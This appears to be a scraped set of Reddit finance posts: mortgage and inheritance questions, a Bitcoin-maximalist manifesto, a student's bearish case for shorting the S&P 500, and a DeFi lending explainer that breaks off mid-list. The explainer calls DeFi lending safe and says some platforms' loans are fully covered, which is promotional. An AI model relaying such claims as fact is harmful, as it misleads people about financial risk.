On the other hand, the 30-year fixed rate has a higher interest rate which means lower monthly payments over time but I pay much more money overall for the property long-term. I plan on paying up to $7000 down-payment (3.5% on a $200,000 home.)

The way to get around this is to pay the 15-year monthly payments on the 30 but I plan on paying this house off as fast as possible by combining different sources of income on the car:

\- Renting out most of the rooms in the first 12 months. Then I move out and rent out my room to another tenant and let a PM take care of the house. I can't do it before then because under FHA its not allowed.

\- Purchase and rent out a small fleet of 3 or 4 vehicles over time. This actually would add up pretty well assuming I do it right. I could earn between $600 to $800 a month for each vehicle and put that in the house. I am still working out the details on a vehicle warranty since many warranties do not allow you to rent out a vehicle and they would find out due to the odometer reading rising astronomically within a month of use. But regardless, I guess I will have to repair the vehicles *properly* myself over time and take it to the shop as a last resort. 

\- I make $2400 a month in my job. My job is pretty stable and I am in good standing.

I don't know if three different sources of income are enough to pay off a house in less than 10 years so I can move on to another house and use the first one as a source of income. If I go for the 30-year I'm gonna pay a ton of money for the house long-term but if I go for the 15-year term my monthly premium will be higher but I can pay it off much quicker.

I guess setting up the room and vehicle rentals would be harder to pull off on the 15-year since I would have to be frugal with my job income and expenses until I start purchasing vehicles that will accelerate the payments. repairing and maintaining them would also be more difficult because I am paying money out-of-pocket on my mortgage on the first year. 

I think I'm trapped in a catch-22 but looks like I might have to bite the bullet and go for the 15. Do you guys have any ideas?",finance

personalfinance,Windfall inheritance - some questions,"I have so many questions but I may parse them out in a few threads rather than all in one to keep the topics separate.  First of all - THANK YOU to all on this board that have set up the info section.  I have read a lot of the sections and especially the windfall page - they are so helpful!  My questions are little more specific to my situation. (I also purchased a couple books on the recommended list and am waiting for them to arrive.)

I am receiving a windfall inheritance of about $3m.  I am in my 30s, married, one kid, one on the way.  Both husband and I have good jobs (each 150K+ annual) and live in a HCOL area.

I am trying to figure out what to do with our mortgage if anything.  We have a 500K mortgage at 2.5% interest, 30 years, 29 years left.  The amortization calculation shows we would pay about 200K in interest over the life of the loan that's left.  If instead I invested the 500K in ETFs for example, with a 9% return on average and 3% inflation so 6% return (?? did I do that correctly?) then I would have $2.3 million in 29 years.  If I paid off the mortgage and instead took the principal and interest that I pay monthly ($2015) and invested that monthly with the same return pattern for 29 years I would have about $1.2m.  Even with the interest from investing the p&amp;i monthly plus the savings of the mortgage interest, I am not at $2.3m.

So all around it seems better to keep the mortgage as is with such a low interest rate, and invest the monies that I would have used for that.  

Am I thinking of this the correct way?  

(Like I said, I have a lot of questions so will definitely diversify all of this, but wanted to start here for now.)",finance
Bitcoin,"Brothers and sisters, I’ve seen the light, and I get it now","* I understand Maximalism 
* I truly understand what Satoshi created
*  This is the beginning of the greatest revolutionary since the separation of curch and state. 
* This is an opportunity for genuine sovereignty
* I understand the threats of buy ups 
* I understand the threat of dilution through shitcoins and altcoins (Don’t get me wrong, some of these are noble endeavors - anti corruption, privacy, net neutrality in particular - but it’s mainly the creators, institutional supporters and investors of those projects who are the beneficiaries.)

*This is a long read, but I think it’s great insight into how a new user in the crypto community is behaving today, what they’re exposed to, bombarded by. You might be happy where your thoughts are or your knowledge, but this is about so much more.*

**How did I get to this point?** 

**Timeline:**   
**2015:** Post MT Gox. My friend re-introduces interest in Bitcoin. He was using it to buy drugs, awesome, but I liked the anonymity, understanding cash’s days were numbered. 

He explained the basics, exchanges, mixing, wallets, TOR. I tried to learn about it, but being an undiagnosed dyslexic it was overwhelming, I just couldn’t get my head around it all, and I used to be hard on myself with stuff like that. So I shelved it.

**2015-2017:** Shit got fucked. Life was full of media driven public fear, terrorism, planes missing, Robin Williams, Brexit, Kanye, Trump, you ‘member. 

**Late 2017:** The hype starts building again, this time in a really big way. FOMO starts kicking in for me, and you think it’s about to moon - but I was travelling and unable to get in on it. 

I’m sure there would have been a lot of new adopters that were finally ready to take the plunge and got burned (and probably never returned). Many sold and took a loss, but the legends who knew HODled - because you don’t make a loss until you sell. 

Anyway, I laughed and reinforced my misconceived idea of BTC and how lucky I was to avoid the whole mess. 

**Mid-Late 2019:** I’d seen my dad (single) struggle all his life with money and I wasn’t prepared to risk what I’d earned. I joined a new bank, I’d shopped around for the best interest rates possible for a term deposit – ‘safe money’. The following month rates were cut and the rate I shopped for dropped. As the months went on the rates kept getting slashed.

**Late 2019:** I’d already started hearing whispers about COVID and its impending impact, and also understood that the stock market was artificially inflated - they knew. So I didn’t go near it.

**2020:** Then it hit. The stock market crashed. But it recovered quickly. People weren’t spending like they did before, so there was a lot of money around. But the world is paralyzed again, media driven fear, division, politics, pandemic.

**2021:** $GME! And the feeling in the air starts changing all of a sudden, the little guy has got some say in this world. I open a trading account, and open a crypto exchange account. Maybe the stock market thing kinda changed the way we were thinking, but we begun buying BTC and alt coins treating them as speculative commodities. I started reading about a bunch of different projects, finding ones I believed in, trying to get in early on the next big thing. This industry had grown and there was a lot of new terminology and institutions.

This is a daily habit now, a little in stocks and efts, more in crypto. 

I noticed all the shitcoins moving the last couple weeks, while BTC had been pretty stable.

I read a comment on r/CryptoCurrency last week about a user getting banned in here for talking about being banned for posting about other coins here, I can honestly say that planted a seed in me. (But this can go the other way, be seen as alienating. I'm quite stoic and not emotionally attached to many of the projects I invested in.)

**Last week:** I came across this ad for crypto.com, I’ve seen it around for a couple years. Cashback, cashback, cashback MF! Well, I’m a crypto guy now, I may as well get ahead of the game, earn some passive on my spending. I search every debit card, comparing their reputations, mixed results, but a lot of information out there. Who’s to know what is a good source of crypto news and what isn’t? 

Fuck it, I’ve already got Spotify and Netflix and these guys are offering 100% rebate if I stake just XXXX and offering a return XX, with X% cash back. 

I take the plunge.

My payment fails. Ah fuck, maybe it’s my limit. I’ll call the bank tomorrow. Crap, it’s good Friday, bank’s closed. Hmmm, I’m bored, CRO is trending up, they recently did a(n artificial) burn, there is a bit of hype, and their indoctrinated army is screaming x5, x10. 

Maybe I’ll just get the tier down, that’s inside my limit. That didn’t work either, my bank must be blocking. Damn, I gotta wait the whole long weekend...

I start looking more into them, their CEO, watching interviews, scrutinizing his body language and his speech. Hmmm, this guy is a little sus. I do some more research and find out he’s been involved in another failed crypto start up a few years back. He’s also become ‘one of those’ full time CEOs.

I realize they’re getting people to stake and all these incentives, designed only to keep coins/money staked and in the system. They are very innovative and lots of new products designed to do the same thing.

How can they offer guaranteed returns that are better than what Warren Buffet could get you? And I see huge risk. I conclude they must be using fiat to prop up their card payments, there probably isn’t much movement of actual crypto once they get their hands on it. I would never want these guys to be holding my crypto.

This shit’s gotta be ponzi scheme. 

(That’s all speculative, the mind can wander when it goes down the rabbit hole.)

Thank the universe! Thank you for looking out for me, I believe in you, I believe in something greater than us - in fate and destiny. Everything happens for a reason.

Later that night I stumble on this absolute legend called Rogzy – go watch his shit [https://www.youtube.com/channel/UC1an4kt62LVUkStoVQ0ChBQ](https://www.youtube.com/channel/UC1an4kt62LVUkStoVQ0ChBQ) I can’t believe he only has 100s of views on his videos, when some of those scammers have +100K. Creaters like him need to be known and shared.

He saved my life, this guy taught me everything I had ever been hoping to lean. For free! He even built a free course. He goes through everything and provides some easy to understand material. 

This is the kind of content newbies are crying out for, and it all helps the cause in the end.

**Some observations:**   
*I’ve worked for a multinational propaganda machines (advertising agencies) covering the ass of clients including BP during the gulf ol Mexico oil spil, Car manufacturers during their NOX cheating scandals, among other things. I have an understanding that each one of our realities is different, and know a thing or two about the mind and how its being hacked at today.*

* New crypto content is created daily (podcats, websites, vids, articles, sociials) and the views shared here are becoming washed out. This can be countered by participating in different areas than you’re used to, or creating your own content.
* As time goes on things become normalized in our lives, and less exciting, the thrill something gave you doesn’t release the same amount of happy chemicals in the brain. Engaging with people and teaching is a great way to feel that excitement all over again.
* There is a general war on our intuition, in this day of over information in general, we are bombarded with ‘news’ and information that makes us for a conception of the world. 
* I think a lot of the ‘stimmy’ money is going into shitcoins because the lure of striking it rich is too real, while BTC has a 

**Some things you should know:** 

* Unbiased media doesn’t exist anymore, the illusion is there, but those institutions are dead. Even ‘good’ outlets are bias, but they are trying to tug the rope the other way so they have agendas too.
* It's the entitled children of boomers are running the show now, and while they wield a lot of power this gives us great opportunity. Narcissistic with big egos can become easily complacent. 
* There are definitely orchestrated efforts from other projects through incentives, operatives operating as users, even with multiple accounts. It’s a complicated ecosystem, but this community isn’t as pure or united as it used to be.

**Competition Spotlight:**

* Binance: Why support a project that’s going to all this effort and creating all this risk, when there is the all mighty BTC. Why help make this dude a millionaire? [https://www.coindesk.com/binance-regulatory-evasion-tai-chi](https://www.coindesk.com/binance-regulatory-evasion-tai-chi)
* Kris Marszalek – What a great CEO, so well spoken, articulate, so manicured. What’s he hiding? Where has their Crypto.com wikipedia page disappeared? And how are they offering these deals? ‘If it sounds too good to be, it probably is’. What's thier end game? I'm expecting tears.
* XRP – Is this a project of the establishment, of big money? Is the SEC thing just one big marketing campaign? They are hold so much of the supply and have a really weird system for releasing more. There seems to be a big loyal group of HODLers who think this project is ‘the one’.
* Ethereum Project and a lot of the guys/coins that came out of that seem egotistical and narcistic. Why would you go here and settle for less when you have BTC?
* **Fuck Malta. (For tax evasion and regulation reasons (creates environment of no repocutions), the people are lovely.)**

*Some of these are just assumptions, half-baked ideas, half researched conclusions, general intuition and the leveraging of my lived experience/skills. I’m new to this space and don’t have a complete understanding of things. So this ain’t gospel.*

**Some things the community should remember:** 

* Bitcoin has no marketing budget like the other coins and exchanges, it only has the community, you and I.
* Setting up a joint entity, or funding one that already exists so we can creat a marketing apparates, for th common good, would be in all our interest. Teamwork makes light work.
* IT's important to grow and engage with all levels, all ages, and knowledge bases. Don’t become a recluse, don’t be afraid to visit other boards and shoot down trash. But keep it health for yourself.
* The community needs to keep investigating and scrutinizing 3rd parties, regularly. Analysis into what their objectives are, what changes they make. And sharing those findings.

**Some things you can do:**

* Create content, on whatever platform you like just create content. Keep it coming so this doesn’t happen. [https://www.investing.com/news/cryptocurrency-news/ethereum-popularity-on-youtube-surpasses-bitcoin-2469045](https://www.investing.com/news/cryptocurrency-news/ethereum-popularity-on-youtube-surpasses-bitcoin-2469045) This has a nock on effect and big influence, again hacking peoples psych.
* Share your learnings, tips, tricks. Like what are the best and safest exchanges? (Why haven’t we built our own (could that even work?))
* When creating content, don’t be afraid to ask for any form of currency, we are still transitioning. Pay your bills and live of the fiat. Swap shitcoins in to BTC. (Hey, that’s a great hashtag campaign #Shitcoins4Bitcoins)
* Don’t be a snob, create videos about all crypto – even if you have an ulterior motive, write a clever script and frame it how you like. So you can reach a wider audience.
* Colaborate together, share your skills and offer support like seo, deign if you have the time. We’re a family.
* Keep innovating in the space.
* Get your BTC out of the exchanges, learn about security, set yourself up now, right now. Not tomorrow, do it now.
* Share content, it doesn’t have to be yours, just share whats out there. Use popular hashtags, reply to users on all platforms.
* Don’t be afraid
* Get out of your silo
* Take care of your health, eat well, get some fresh air, exercise, and always remember that you are an incredible person who has a lot to give.
* Have patience.
* Love yourself

**Things to remember:**

* You are an incredible person and you are special, the knowledge you have is valuable and worth sharing. 
* Don’t flaunt what have, your wealth or your earnings, security, etc.
* The knowledge you have is only common to you only, you have a lot of experience and wisdom. Even if you’re hitting only a small 
* Even if you’re not an expert you probably know more than someone else, so share what you know – but never 
* Everyone learns differently 
* Security, wallets and such can be daunting compared to the nice UX exchanges
* Don’t become complacent

* Never forget that Elon pumped $1.5B (worth a lot more today) 5-10 of its total equity. (I remind myself of this everyday when my confidence is waning.)

Something is going to happen, it’s bound to happen, corrections will happen, but don’t be scared.

Our home load guy says he can do (we have VA Loan) 3 years at .75 and at 4 years it would go max to 1.75 max and in 5 years it would go to 2.75 max. By then I'm sure we'll have refinanced. We aren't taking cash out and are just looking at a lower payment. We would save about 530 a month for 3 years.

stocks,Is there any sensible reason to not short the SPX right now?,"**Hi!**

First off sorry for the vague title. I don't know if this fits on this sub but I decided to take that risk.

Student here, working part time at an institutional asset manager (and not a native english speaker). I seem to be confused with the current market behaviour as it defies everything I've learned so far.

I would really appreciate if anyone could beat some sense into me and educate me as to why I shouldn't sell and heavily short equities right now. I already lost the biggest part of my portfolio this week but I just don't seem to be able to change my mind. 

To start let me summarize the current situation (note that the selected information will be biased by me, even if it's not conciously). I will mainly focus on the S&amp;P 500 (SPX/\^GSPC) for simplicity and structure it like this:

\------------------

1. Index Price and Analyst Expectations
2. Indicators and Benchmarks
3. Economic Numbers, Trends, News and Sentiment

The rant is happening in part 3 mostly. I'm not sure if it's allowed but I linked some pictures with imgur-urls. 

\-------------------

**1a) Analysts Targets**

During this week, I heard about 10 Analysts from Banks and Asset Managers (GM,JPM,CS,UBS, some hedge funds) say that they expect the S&amp;P to have an upside-potential to 4'200. The expected EOY-Median is also 4'200, though the Expectation for EOY 2021 was only 3'950-4'000 at the beginning of this year.

[https://imgur.com/3yr48h3](https://imgur.com/3yr48h3) (Short Term Boundaries)

It seems kind of weird to me how we almost already touched that 4'200 upper limit. Even weirder how every single analyst had the same target for the S&amp;P 500 and every single one said ""we remain bullish on US equities"". Their explanations haven't really convinced me as none of them could really answer the shows hosts on the question why they remain bullish even though we're up that far already.

We hit ATH 20 times this year, with 5 of them having happened in the last 10 business days.

[https://imgur.com/UaU36hQ](https://imgur.com/UaU36hQ) (ATHs marked red (SPX Closing Prices))

With earnings ahead, I don't get how this should be going even further up. Especially on the news we're facing (see further down part 3).

\--------------

**1b) Volume and VIX**

* *Trading volume can signal when an investor should take profits and sell a security due to low activity. (Investopedia)*
* *In the U.S. stock market and many other developed financial markets, about 70-80 percent of overall trading volume is generated through algorithmic trading.*
* *The algos provide great liquidity when there is no news, but when a big new comes in the algos go away until things stabilize.*

Hmm okay. We had 70 business days so far in 2021 and out of the last 10 there are 7 days in the top 10 lowest daily trading volume (YTD, since 01-01-2021). If we're supposedly in 'bullish' situation, why is the volume going down so rapidly and the trading so frothy? Are the algos idling to meet the ESG-benchmarks or?

[https://imgur.com/aYBtNtd](https://imgur.com/aYBtNtd) (Rank of 10 last trading sessions (1=Lowest Trading Volume YTD on S&amp;P 500))

We're also at the lowest VIX-Level on the 1Y-Chart which I learned is usually a sell signal (shortterm).

[https://imgur.com/ZaDBIg7](https://imgur.com/ZaDBIg7) (VIX 5Y Chart)

\-----------

**1c) Psychological Factors (SideNote)**

April has been the best performing month for US equities for the last two decades. April was performing net-positive in 14 out of the last 15 years (excluding 2008).

The best performing equities in april are historically european stocks, followed by US stocks.

Knowing that this month started at 3'992 (ATH) I'm having doubts that the trend will repeat this time though.

\-----------

**2) Technicals**

**2a) MA, MACD**

I'm kind of a believer in the theory that most technical indicators only work because actual systems and people trade by their principles. Having said that it's obviously kind of misleading to use momentum indicators as all of them are giving us strong buy signals even at ATH levels:

[https://imgur.com/QxEygiE](https://imgur.com/QxEygiE) (Barchart Indicators with their buy signals)

Just to note; we're obviously above moving averages at this point: 

[https://imgur.com/7kKPwvj](https://imgur.com/7kKPwvj) 

\-----------------

**2b) RSI, PE Ratio**

It's really difficult for me to evaluate the usefulness of value-based indicators like the buffet-indicator or the PE ratio. They ignore the decrease in interest rates and the influx of retail money into equities:

[https://imgur.com/S86bESi](https://imgur.com/S86bESi)

Without that in mind the stock-market values would look pretty wild at this point;

[https://imgur.com/BtImQgc](https://imgur.com/BtImQgc)

**2b) PE Ratio**

The same logic applies to price-to-earnings ratios;

[https://imgur.com/mKqm5G5](https://imgur.com/mKqm5G5) (Shiller/CAPE PE Ratio for the SPX)

Still ... what bothers me is that the PE ratios of US indices are so much higher than the rest of the world:

[https://imgur.com/2D415BE](https://imgur.com/2D415BE) (Shiller/Cape PE Ratio major equitiy indices)

The worst one is not even listed here - the current ratio of the NDX (Nasdaq 100) lies at 50.19!

It's as if investors don't expect any growth outside of US companies or am I interpreting that wrong? It's not like inflation is higher in the US either (though there is a certain depreciation in the USD).

And if the earnings so obviously don't matter (anymore), how can analysts like this guy from Credit Suisse say that the prices are soaring due to the strong earnings??? (Src; Bloomberg-Link)

And lastly I understand the 21day-RSI crossing 70+ as a sell signal or is that wrong again?

[https://imgur.com/xMAFJrv](https://imgur.com/xMAFJrv) (SPX 21D-RSI on lower chart with BS-boundaries on upper chart)

\----------------

**3) Economic Data, Trends, News, Sentiments**

Oh god here we go. I will not provide as much details and pictures so let me summarize the most important points IMO a bit:

3a) Job Market

&amp;#x200B;

|Date|Actual|Expected|
|:-|:-|:-|
|25-mar|684|730|
|1-apr|719|680|
|7-apr|744|680|

* The weekly jobless-claims reached a pandemic-era low **2 weeks ago** (25-mar) which resulted in the index going up 50bp.
* **Last week** we had larger-than-expected jobless claims which resulted in the index going up 50bp.
* **This week** we had way larger-than-expected jobless claims which resulted in the index going up 30bp.

It's weird how these numbers were celebrated and being sold as the reason for rising equity prices with one reason being that the FED seemingly only talks about the job numbers as their motivation for propping up the economy.

Now that the numbers went bad they suddenly do not matter anymore. It actually pissed me off how Tom Keene saw these numbers on Bloomberg TV and said ""if we're being honest, how much do these numbers matter anyway? They are just transitory""... like ... why did you care about them before then?

\-------------

**3b) Inflation and Yields (fixed income)**

You guys probably kept an eye on the treasury yields too as they seem to have caused a small taper tantrum in the first days of march. Analysts expect the 10Y US Tr. Yield to reach about 2% this year. As the treasuries usually act as benchmark for other assets, mortgage interest rates and bond rates have spiked as well.

This SHOULD be bad for high-risk assets (also as in high debt-ratios) short- to mid-term like overvalued stocks as found in the Nasdaq/SPX-Components. News Outlets were talking for WEEKS about the reflation trade and the shift from growth to value stocks. There were theories about quant funds shifting big time etc. ... as it stands we're kind of back with our major growth indices though?

[https://imgur.com/3Fv1mVn](https://imgur.com/3Fv1mVn) (YTD: NDX and SPX above and 10Y Tr. Yield below)

It's not like the treasury yields have retreated much, but for some reason the major tech stocks all jumped 5% to 15% this week... and they're saying that financial corps will do the same next week.

The PPI data released today only indicates even higher inflation expectations - same in other countries like china (4.4% actual):

[https://imgur.com/vh4TDek](https://imgur.com/vh4TDek) (US PPI Month over Month)

I get that higher yields are good for the financial sector and that a depreciation in the USD drives US equities as well (and inflation in US = USD loses value c.p.). But I still don't see why tech jumped.

\------------

**3c) Risk in the financial sector**

With low yields (well until recently) the leverage ratio increased substantially and even the FEDs balance sheet kind of imploded due to the pandemic. There is so much money in the market and so much leverage just so guaranteed rates can be delivered ... I wonder how this is not a sign of risk to anyone?

We just had the bust of a fund with Archegos that erased about USD 194 billion of market value and a similar picture with Greensill capital or the supposed short-sellers of equities in january. Even after this, Credit Suisse somehow thinks that they have proper risk management lol. And I wish I wouldn't have to say that about one of our 'national' banks ... sigh. Oh and somehow Citibank just lost 500M in some transactions... woops?

\-----------

**3d) Tax revolution**

The current projects on better international tax collaboration, higher corporate and individual taxes, a minimum tax rate for companies etc.... all of this sounds like bad news for companies... but somehow it get's ignored??? Someone help me on this please.

\----------

**3e) Vaccination Progress**

At the current rate, we will achieve global herd immunity in 2022 with cases rising again in Europe and developing/industrial countries.

[https://imgur.com/Kh2blNg](https://imgur.com/Kh2blNg) (Low progress in less wealthy countries)

It seems like the lagging progress outside of the US doesn't concern the market in the least as we can see with ATHs on european and asian indices. I guess Tom Keene would say that these numbers are irrelevant anyway.

\-----------

**3f) Chip Shortage**

Major car manufacturers halted production (GM, Ford) this week and many tech products can't meet demand due to the delay in production (like the current MacBooks). It's a consensus that this issue will stay for a few years since the building of factory sites and so on usually takes a few years.

This is pretty bad news, right? Obviously this means that the market has to go up... like ... I don't understand. This is an obvious issue but somehow these stocks just go up ...

\---------------

There are many other bad news like the Ukraine conflict (where talks about a possible war exist) or the Oil price dilemma and uncertain future of crypto currencies. Or upcoming (major) bond auctions on monday with the release of the new fed bond buying program pace on wednesday. But I'm leaving it at this right now.

\---------------

Lastly I want to note my personal destain for Bloomberg News as they seem to be publishing some weird articles lately. There are major news but they kind of spin it into 'good news' and (for example) talk about the potential of SPX hitting 4'100+ this week instead. I mostly resorted to Reuters and selected smaller outlets last week for this reason.

\---------------

Ok guys, that's it. I would be happy to have someone explain me why I should be 'bullish' on the SPX. I just loaded up on puts (structured products) after losing most of my portfolio this week on rather heavily leveraged puts.

Thanks to anyone for reading this.

personalfinance,Getting Mortgage for House in Poland?,"Hi all,

I am an American expat living in Germany and am looking to buy a beach house in Poland to get away with family in the summer. I want to get a mortgage for the home to take advantage of the very low interest rates right now, but unfortunately this is proving very difficult because:  
\- Germany, where I live, will only give me a loan if I buy something in Germany.

\- Poland will only give me a loan if I work in Poland, which I don't.

&amp;#x200B;

The thing is, I figure there must be a way to do this as I have more than the full amount of the home in investments, so I'd expect there to be some way I can use these investments as collateral against the mortgage, but I haven't found anything like that out there. Has anyone done something like this before?

personalfinance,Who should a Canadian medical student (who is by no means well off) talk to about how to manage my finances?,"I don’t spend a lot on myself. I’m 21F and living on my own. My parents support a lot of my living but they aren’t terribly well off themselves... and my little sister is 9 years old and has lavish expenses ahead of her. I want them to be able to retire comfortably and pay off their mortgage. I feel really bad for them and wish I wasn’t such a financial leech. 

I tend to spend on gifts and experiences when I’m with friends or loved ones (though I try not to be excessive either) because I figure I’d like to see them happy and I’d like to have good memories of my 20’s that aren’t just centred around studying. I do love school though and am very grateful to be learning medicine. I’d like to pursue surgery. 

I’m trying to get a tutoring gig lined up - but I also am about to begin 3 research projects (unpaid, but a necessary aspect of being a good med student) so I worry about time. Tuition is expensive, so is rent, I don’t need to be stating the obvious.

I have a lot of anxiety about money. I also have a 300k line of credit I don’t want to touch (although I used it to pay off a car that I need to get around for the rest of med school and residency - $21k - so it should be good for about a decade at least). I did this since the bank was giving a higher interest rate for financing the car loan than for the line of credit. I’m nearing the end of my savings and my RESP (which I didn’t use a lot of because I got scholarships here and there in undergrad - and didn’t have to finish my undergrad before getting accepted to med school). 

I have a neat little budget, but with all my anxiety - sometimes I feel obligated not to spend on things that I honestly do need... when I track so rigorously. I also need guidance outside just my budget - I don’t know a THING about money.

I also stay clear of any leisure that might cost me when I budget to the number. This has negative effects on my (often fragile) mental health.

personalfinance,What to do? Inheritance/Mortgage,"Hi! First, thank you for taking the time to read, I really appreciate any input and apologies for the long read, it's a little complicated.

My dad passed away earlier this year and didn't leave a will. Our house (a duplex) in Los Angeles, CA was the only asset he had and I have a lawyer who is helping me avoid probate (this is the least complicated part and not as concerned here, he said it's community property). My question is for after my mom gets the title. Along with the house, I was able to get an $80K cash out from life insurance and I don't know what to do. I will be taking responsibility for making the decisions as far as what to do with the money, house, etc. My mom is disabled and can't work and I also have a little sister, I want to make sure that whatever decision I make won't impact them negatively. So here is the info/questions:Long story short the total mortgage adds up to about $546K but the catch is that $176K is a balloon and wouldn't be due until the end of the mortgage which wouldn't mature until 2054 or 33 years from now with a 4% (current) rate for the other $370K. Additionally, the property taxes are incorrect which is a total of \~$9K/YR + home insurance the total monthly mortgage payment is almost $2,900/month mostly because of the amount the bank keeps as a reserve on the bi-annual payment of property taxes. One of my main goals is to reduce the monthly payment. 

1. I was told I can't fight property taxes YET because we're not the owners yet but once I do, I can significantly lower from $9K -&gt; $5.3K. I'm assuming the city just increased taxes without a full evaluation of the home, which needs A LOT of work. The fact is the home is currently probably worth $670-720Kish but I think that if it was fixed it would almost be a million dollar home; it's a duplex and is currently generating $1.6K in monthly rent and we live in the larger complex. With the fix in property taxes, I'm thinking I will set aside the money annually, and that way I will reduce the mortgage payment to around $2.1K. Thoughts on this? 
2. The next question is what to do after that? The balloon actually doesn't scare me, I like the fact that I can have a lower payment so that with rent I only have to put in $500 of my own pocket the mortgage payment and have a good chunk of change to save/invest (this is from my own salary). The thing that terrifies me is the moving interest rate, by next year it will move to 4.5% (I think the cap is 5%)!!!! So the question is what should I do? Do I use the $80K from life insurance to refinance OR do I use that to fully fix the rental unit and get more in rent? The home is currently rented but I know that the tenants are leaving soon and I don't know that with the state of the home is in that I would be able to still to get someone in at the price.

My concern is putting in more $$ for the mortgage monthly since I will be covering all living expenses now for my mom, sister, and me. Also, my sister will be going to college in two years and I want to make sure that is covered as well and I rather save a good portion of my income for emergencies, when the home isn't rented, etc.",finance
CryptoCurrency,DeFi Explained: Lending &amp; borrowing,"DeFi had recently breached a new milestone: after breaking $100 billion TVL, it managed to be the equivalent of a top 40 U.S. bank. New investors are moving their assets to DeFi on a daily basis. And at the time of writing, lending and borrowing platforms are becoming widely popular. Which brings us to the question: What is all the fuss about lending and borrowing in crypto? And who are the big players in this game?

## What is crypto lending?

Crypto lending is an alternative investment form, where investors lend fiat money or cryptocurrencies to other borrowers in exchange for interest payments. This means there are two main parties involved in this loan:

* The lender, who will receive interest from the borrower in exchange for the loan.
* The borrower, who will deposit crypto-assets as collateral to secure the investor’s investment.

By depositing collateral, lenders can be sure that if something goes wrong the collateral will be used to compensate them. All DeFi lending services are based on blockchain, which is usually the Ethereum blockchain. This means that there are no traditional banks or custodians.

## Why Crypto Loan Rates Are So Attractive

Traditional banking does not offer any attractive interest rates anymore. Some of them even go so far as to have a negative deposit rate. No wonder many investors are looking for more lucrative opportunities in search of passive income.

Cryptocurrency lending is still a topic of debate, but more and more people are turning to crypto loans as an alternative source of income. Interest rates can even go up to 30%.  DeFi is a young and evolving market and the demand for it is constantly increasing. Borrowers can take out cryptocurrency-backed loans to ensure they have available funds while avoiding losing their exposure to specific crypto assets.

The lenders are those who help provide these loans to the borrowers through DeFi platforms, and often through centralized financing (CeFi) platforms.

It is no secret that DeFi has taken the crypto lending industry a significant step forward. Let’s take a look at the advantages:

* All loans are provided through smart contracts. Every detail of the loan has been automated and verified.
* DeFi lending does not require custody to perform any operation.
* Income interest is automatically adjusted to the market.
* The interest or collateral is collected automatically, so no need to worry if the deal goes wrong.

In short, DeFi loans have proven to be a safe and easy way for investors to make their money work for them without breaking a sweat (that is if you don’t look at your investment every minute).

## The Crypto Lending Ecosystem

While crypto lending platforms are not classified as banks, they can be centralized or decentralized entities such as Nexo, BlockFi, Celsius, Aave, Yearn.finance or Compound. These crypto lending platforms play the role of the middleman in both CeFi and DeFi.

## Top crypto lending platforms in DeFi

Crypto lending platforms are springing up like mushrooms, which can be confusing for investors. So, for the sake of clarification, let’s review some of the well-known crypto lending platforms in DeFi:

## Aave

The name Aave comes from the Finnish word for ""ghost"" and is a lending protocol on the Ethereum blockchain.

The main feature of Aave is its open-source environment. It is a non-custodial protocol that allows for decentralized lending and borrowing. Lenders provide liquidity to the market to generate passive income, while borrowers can… well, borrow! After providing collateral of course.

Lenders earn from ERC20 compliant aTokens at a ratio of 1: 1 to the delivered assets. This means that while lending 36 Dai, they receive 36 aTokens (in this case, 36 aDai).

Interest rates are adjusted algorithmically based on supply and demand, but Aave allows borrowers to choose a stable interest rate (at any time) that changes less often. What makes Aave unique is its latest feature: flash loans. This feature allows borrowers to borrow any available amount of assets without collateral.

## Compound

Compound is an algorithmic money market protocol on Ethereum that, like Aave, allows you to borrow or lend money and earn interest for providing collateral. The interest rates are automatically adjusted based on supply and demand.

As in the case of Aave, asset balances provided are represented by ERC20 minted tokens, but in Compound’s protocol they are called cTokens. When the investors received their cTokens, which is after providing collateral, they can borrow up to 50-75% of their cTokens value depending on the type of the underlying asset.

The Compound Protocol reserves 10% of the interest paid as reserves; everything else goes to the lenders.

## Yearn.finance

The Yearn Finance platform communicates with several other DeFi protocols on the Ethereum blockchain with the aim of maximizing the investors’ returns. It can be described as an AI advisor for DeFi returns. Because of this, investors can earn the most from lending their stablecoins. Yearn works purely based on codes without a financial intermediary.

Yearn has an automatic reward system has been developed based on the YFI token. The Yearn platform consists of several products:

* Earn - Earn indicates where the highest interest can be earned by lending a crypto asset. Earn searches across different lending protocols such as Balancer, Aave and Compound to find the best interest rate. Users can deposit DAI, USDC, USDT, TUSD or sUSD on the yearn.finance platform to start earning interest.
* Vaults - a collection of investment strategies designed to maximize returns from other DeFi projects and operate as actively managed investment funds. The use of these decentralized funds does not come without risks. The yDAI vault was robbed of $11 million dollars due to a vulnerability on February 5, 2021.
* Zap - allows to combine and execute different trades with one click to save time and money. Thus, an investor can instantly trade DAI for yCRV in one click instead of three different actions across the Yearn.finance and the Curve Finance platform.
* YFI tokens - Users can earn YFI tokens by placing cryptocurrencies in Yearn.finance contracts running on the Balancer and Curve DeFi trading platforms, which use the Yearn.finance platform.

Because of these features, Yearn.finance provides an extensive yield farming service that enables users to capture crypto assets in a DeFi protocol in order to automatically earn more cryptos and achieve better returns.

## Top crypto lending platforms in CeFi

While writing this article, gas fees on the Ethereum blockchain are reaching absurdly high numbers. This makes investing in DeFi for smaller investors not profitable. They could, however, consider CeFi platforms. With CeFi, investors trust the people behind a business to ethically manage funds and execute on services the business is offering. This differs from DeFi, where investors trust that the technology will function as intended to execute on services being offered.

## Nexo

Nexo is a cryptolending platform founded in 2018 by the same people that were behind Credissimo, which is an organization that has more than 10 years of experience in offering loans. It is probably the most known CeFi platform of this list. Like Compound and Aave, Nexo offers a service that allows you to act as both a borrower and a lender. The platform is especially interesting for investors who think that they currently receive too little interest on their savings account (which is everyone). At Nexo you receive up to 8% interest on your euros, dollars, pounds or stablecoins.

The benefits of Nexo are:

* Fully licensed and regulated.
* Insurance up to $ 100 million (BitGo Custody).
* Fully automated platform.
* Processed more than $ 1.5 billion.
* 8% interest for lenders.
* Flexible loan with 5.6% interest for borrowers.
* All loans are 100% covered.

It’s also worth noting that Nexo is developing a payment card called the Nexo card, which allows investors to spend the value of their digital assets without having to sell them.

## Block.fi

BlockFi is a peer-to-peer credit marketplace that was founded in 2017 by a number of key figures from the financial sector. Block.fi supports the following coins: Bitcoin, Litecoin, Ethereum and Chainlink. They also support USD stablecoins. Like the other platforms, interest can be compounded. BlockFi charges a withdrawal fee, which is deducted from the total withdrawal amount. Investors get 1 free withdrawal per month, so if you plan your withdrawals strategically, you pay no fees at all.

## Celsius network

